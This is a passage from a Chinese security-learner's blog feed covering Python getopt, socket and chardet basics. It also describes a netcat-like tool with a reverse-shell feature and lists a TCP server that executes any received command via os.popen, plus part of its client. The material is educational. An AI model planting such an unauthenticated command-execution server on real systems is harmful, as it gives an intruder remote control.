punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'--condition=foo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--testing'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--output-file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc.def'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a2'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> optlist<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'conditions='</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'output-file='</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'testing'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> optlist</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--conditions'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'foo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'--testing'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'--output-file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc.def'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> args</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'a1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a2'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>#options 存的是短格式和长格式<br />\n #args 存的是除短格式和长格式之外的，也就是存没有 - 和 -- 的</p>\n<h2 id=\"socket库\"><a class=\"anchor\" href=\"#socket库\">#</a> socket 库</h2>\n<blockquote>\n<p>再复习一下怎么建立 TCP 通信</p>\n</blockquote>\n<h3 id=\"创建一个tcp-client端的流程\"><a class=\"anchor\" href=\"#创建一个tcp-client端的流程\">#</a> 创建一个 TCP client 端的流程</h3>\n<ol>\n<li>创建套接字\n<ul>\n<li>client_s = socket.socket (socket.AF_INET, socket.SOCK_STREAM, 0) 协议号可以省略</li>\n</ul>\n</li>\n<li>建立连接\n<ul>\n<li>client_s.connect((ip, port))</li>\n</ul>\n</li>\n<li>接收数据或者发送数据\n<ol>\n<li>client_s.recv (bufsize)\t接收数据，数据以 bytes 类型返回，bufsize 指定要接收的最大数据量。</li>\n<li>client_s.send ()\t发送数据。返回值是要发送的字节数量。</li>\n<li>client_s.sendall ()\t完整发送数据。将数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回 None，失败则抛出异常。</li>\n</ol>\n</li>\n<li>关闭连接\n<ul>\n<li>client_s.close()</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"创建一个tcp-server端的流程\"><a class=\"anchor\" href=\"#创建一个tcp-server端的流程\">#</a> 创建一个 TCP server 端的流程</h3>\n<ol>\n<li>创建套接字 server_s = socket.socket (socket.AF_INET, socket.SOCK_STREAM, 0)</li>\n<li>把套接字绑定到本地 IP 与端口 server_s.bind ((IP, port))</li>\n<li>设置最大连接数量 server_s.listen (5) 设置你想设置的数字</li>\n<li>等待连接\n<ul>\n<li>server_s.accept ()\t被动接受客户端连接，(阻塞式) 等待连接的到来，并返回（conn,address）二元元组，其中 conn 是一个通信对象，可以用来接收和发送数据。address 是连接客户端的地址。</li>\n</ul>\n</li>\n<li>接收数据或者发送数据\n<ul>\n<li>注意事项：\n<ul>\n<li>Python3 以后，socket 传递的都是 bytes 类型的数据，字符串需要先转换一下，string.encode () 即可；另一端接收到的 bytes 数据想转换成字符串，只要 bytes.decode () 一下就可以。</li>\n<li>在正常通信时，accept () 和 recv () 方法都是阻塞的。所谓的阻塞，指的是程序会暂停在那，一直等到有数据过来。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>关闭连接\n<ul>\n<li>server_s.close()</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"chardet库\"><a class=\"anchor\" href=\"#chardet库\">#</a> chardet 库</h2>\n<p><strong>网上冲浪找到廖雪峰老师的博客</strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMTgzMjU1ODgwMTM0MTQ0\"> https://www.liaoxuefeng.com/wiki/1016959663602400/1183255880134144</span></p>\n<blockquote>\n<p>字符串编码一直是令人非常头疼的问题，尤其是我们在处理一些不规范的第三方网页的时候。虽然 Python 提供了 Unicode 表示的 str 和 bytes 两种数据类型，并且可以通过 encode () 和 decode () 方法转换，但是，在不知道编码的情况下，对 bytes 做 decode () 不好做。</p>\n</blockquote>\n<blockquote>\n<p>对于未知编码的 bytes，要把它转换成 str，需要先 “猜测” 编码。猜测的方式是先收集各种编码的特征字符，根据特征字符判断，就能有很大概率 “猜对”。</p>\n</blockquote>\n<blockquote>\n<p>当然，我们肯定不能从头自己写这个检测编码的功能，这样做费时费力。chardet 这个第三方库正好就派上了用场。用它来检测编码，简单易用。</p>\n</blockquote>\n<h3 id=\"使用chardet\"><a class=\"anchor\" href=\"#使用chardet\">#</a> 使用 chardet</h3>\n<blockquote>\n<p>chardet 的使用非常简单，主模块里面只有一个函数 detect。detect 有一个参数，要求是 bytes 类型。bytes 类型可以通过读取网页内容、open 函数的 rb 模式、带 b 前缀的字符串、encode 函数等途径获得。</p>\n</blockquote>\n<p>当我们拿到一个 bytes 时，就可以对其检测编码。用 chardet 检测编码，只需要一行代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span><span class=\"token string\">b'Hello, world!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'ascii'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'confidence'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1.0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>检测出的编码是 ascii，注意到还有个 confidence 字段，表示检测的概率是 1.0（即 100%）。</p>\n<p><strong>我们来试试检测 GBK 编码的中文：</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> data <span class=\"token operator\">=</span> <span class=\"token string\">'离离原上草，一岁一枯荣'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> chardet<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'GB2312'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'confidence'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0.7407407407407407</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Chinese'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>检测的编码是 GB2312，注意到 GBK 是 GB2312 的超集，两者是同一种编码，检测正确的概率是 74%，language 字段指出的语言是 'Chinese'。</p>\n<h3 id=\"decode与encode的区别\"><a class=\"anchor\" href=\"#decode与encode的区别\">#</a> decode 与 encode 的区别</h3>\n<p>这两个函数，一直感觉理解的有些模糊，今天深入研究一下<br />\n 2020 年 12 月 3 日 14:32:14</p>\n<pre><code>encode：编码\ndecode：解码\npython内部编码方式为unicode，decode将其他编码方式转换成unicode编码方式，encode将unicode转换成其他编码方式。\n因此unicode相当于一个中转:\n(1)decode-&gt;unicode-&gt;encode \n(2)encode-&gt;unicode-&gt;decode\n</code></pre>\n<p>字符串在 Python 内部的表示是 unicode 编码，因此，在做编码转换时，通常需要以 unicode 作为中间编码，即先将其他编码的字符串解码（decode）成 unicode，再从 unicode 编码（encode）成另一种编码。</p>\n<p>decode 的作用是将其他编码的字符串转换成 unicode 编码，如 str1.decode ('gb2312')，表示将 gb2312 编码的字符串 str1 转换成 unicode 编码。<br />\nencode 的作用是将 unicode 编码转换成其他编码的字符串，如 str2.encode ('gb2312')，表示将 unicode 编码的字符串 str2 转换成 gb2312 编码。</p>\n<h1 id=\"代码详解\"><a class=\"anchor\" href=\"#代码详解\">#</a> 代码详解</h1>\n<p>这里需要特别注意编码问题，这里引入了个第三方库 chardet 用于解决此类问题，在 linux 系统中默认编码为 utf-8，在 windows 系统中默认编码为 gbk。<br />\nusage (): 用于帮助理解程序的作用以及用法。<br />\nserver_loop (): 服务端主循环，用于接受客户端连接，返还客户端套接字。<br />\nclient_sender ()：用于连接服务端，首先检测是否已经从标准输入中接收数据，如果一切正常，就将数据发送给远程的目标主机并接受回传数据，知道没有更多的数据发送回来，然后再等待用户的下一步输入，并继续发送和接受数据，直到用户结束程序。<br />\nrun_command (): 提供与客户端交互的方法，通过连接将命令结果回传到客户端。<br />\nclient_handler (): 提供上传文件，执行命令，反弹 shell 的功能。<br />\n<s>鸽一段时间<br />\n 2020 年 12 月 2 日 22:56:23<br />\n 没搞完，有时间在搞，非常喜欢用代码去实现一些东西，哎我应该学开发的。。。<br />\n要一心搞 web 安全了。</s><br />\n下图是在 linux 与 windows 上进行程序测试<br />\n图一<img data-src=\"image001.png\" alt=\"\" /><br />\n图二<img data-src=\"image002.png\" alt=\"\" /><br />\n图三<img data-src=\"image003.png\" alt=\"\" /><br />\n图四<img data-src=\"image004.png\" alt=\"\" /></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<blockquote>\n<p>学习到了制作 Unix 和 Linux 风格这种的后面接选项的工具。通过设置全局变量来达到不同的功能，这种编程思想开拓了我的眼界。</p>\n</blockquote>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/py-socket-experiment/",
            "url": "https://or0kit.github.io/Programming/Python/py-socket-experiment/",
            "title": "Python-socket编程",
            "date_published": "2020-11-26T13:18:04.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>计算机双语实验写 |ू･ω･` ) 的。</p>\n<h2 id=\"tcp\"><a class=\"anchor\" href=\"#tcp\">#</a> TCP</h2>\n<blockquote>\n<p>当初看了李华峰的《Python 渗透测试编程技术 方法与实践》里面就介绍了 socket 编程用客户端去控制服务端的的简单远程操控脚本。于是就准备自己写一个，可是写了之后发现自己写的很 Low，于是就想到前辈们常说的 “不要重复造轮子” ，就去网上找了一个，这个还不错。忘记原作者的地址，转载自 CSDN。</p>\n</blockquote>\n<h3 id=\"tcp-服务端server\"><a class=\"anchor\" href=\"#tcp-服务端server\">#</a> TCP 服务端（server）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket<span class=\"token punctuation\">,</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 指的是 tcp 协议</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始等待连接!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    conn<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端地址：\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"端口：\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端连接成功\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始工作\"</span><span class=\"token punctuation\">.</span>center<span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"等待新指令：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            msg <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收客户端信息并解码，默认为 UTF-8 编码</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">elif</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"bye\"</span> <span class=\"token keyword\">or</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"客户端[%s:%s]已断开连接！！！\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"执行新指令：%s\"</span> <span class=\"token operator\">%</span> msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token comment\"># 接受字符串，相当于在 dos 命令界面，执行命令</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                cmd_res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token comment\"># 将命令的结果编译成 \\xx\\xx\\xx, 再进行统计字符数，因为结果中有汉字，编码后的一个汉字</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token comment\">#为三个字符，所以客户端接收的时候也要统计 bytes 类型的字符数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                cmd_size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cmd_res<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> cmd_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果执行的是错误的命令，数据大小就为 0，就执行下面的语句</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token comment\"># 发送一个 0 给客户端，客户端接收的是个字符串 0 就表示命令有误，可以重新输入</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                    <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token comment\"># 发送响应数据的大小（全部是变为 bytes 类型后统计的字符数）    </span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cmd_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                cli_res <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cli_res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                conn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>cmd_res<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 发送真实的数据</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"all send done。。。。。。\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\"># 客户端轻强制断开时，服务端会报这个错误，利用断言来捕获异常        </span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">except</span> ConnectionResetError <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>  </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>TCP黏包问题：</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>面向流的通信特点和Nagle算法：</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>到对方，使用了优化方法（Nagle算法），</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>对于空消息：tcp是基于数据流的，于是收发的消息不能为空，这就需要在客户端和服务端都添加空消息的处理机</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>制，防止程序卡住，而udp是基于数据报的，</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>即便是你输入的是空内容（直接回车），也可以被发送，udp协议会帮你封装上消息头发送过去。</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>可靠黏包的tcp协议：tcp的协议数据不会丢，没有收完包，下次接收，会继续上次继续接收，己端总是在收到ack</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>时才会清除缓冲区内容。数据是可靠的，</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>但是会粘包。</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>黏包有两种：</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>一种是因为发送数据包时，每次发送的包小，因为系统进行优化算法，就将两次的包放在一起发送，减少了资源的</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>重复占用。多次发送会经历多次网络延迟，</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>一起发送会减少网络延迟的次数。因此在发送小数据时会将两次数据一起发送，而客户端接收时，则会一并接收。</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>#即出现多次send会出现黏包</pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>第二种是因为接收数据时，又多次接收，第一次接收的数据量小，导致数据还没接收完，就停下了，剩余的数据会</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>缓存在内存中，然后等到下次接收时和下</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>一波数据一起接收。</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>发送方问题：</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>发送端需要等缓冲区满才发送出去，造成粘包（发送数据时间间隔很短，数据了很小，会合到一起，产生粘包）</pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>接收方问题：</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>接收方不及时接收缓冲区的包，造成多个包接收（客户端发送了一段数据，服务端只收了一小部分，服务端下次再</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>收的时候还是从缓冲区拿上次遗留的数据，</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>产生粘包）</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>'''</span></pre></td></tr></table></figure><h3 id=\"tcp-客户端client\"><a class=\"anchor\" href=\"#tcp-客户端client\">#</a> TCP 客户端（client）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>client <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">>>:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 发送命令</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"bye\"</span> <span class=\"token keyword\">or</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    cmd_size <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收响应数据的大小，此时接收的数据为 bytes 类型</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果等于字符串 0 就表示命令有误</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"执行无结果，可能命令错误，请重新输入\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"数据总大小为：\"</span><span class=\"token punctuation\">,</span> cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 